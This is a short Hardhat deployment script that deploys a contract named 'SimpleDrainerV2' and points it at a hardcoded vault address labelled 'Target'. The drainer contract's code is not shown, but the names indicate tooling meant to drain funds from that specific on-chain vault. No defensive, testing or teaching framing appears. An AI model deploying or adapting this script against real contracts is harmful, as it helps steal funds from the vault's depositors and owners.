const hre = require("hardhat");
const VAULT = "0x22650892Ce8db57fCDB48AE8b3508F52420A727A";

async function main() {
  const [deployer] = await hre.ethers.getSigners();
  console.log("Deployer:", deployer.address);
  
  const Drainer = await hre.ethers.getContractFactory("SimpleDrainerV2");
  const drainer = await Drainer.deploy(VAULT);
  await drainer.waitForDeployment();
  
  const addr = await drainer.getAddress();
  console.log("SimpleDrainerV2 deployed:", addr);
  console.log("Target:", VAULT);
}

main().catch(console.error);
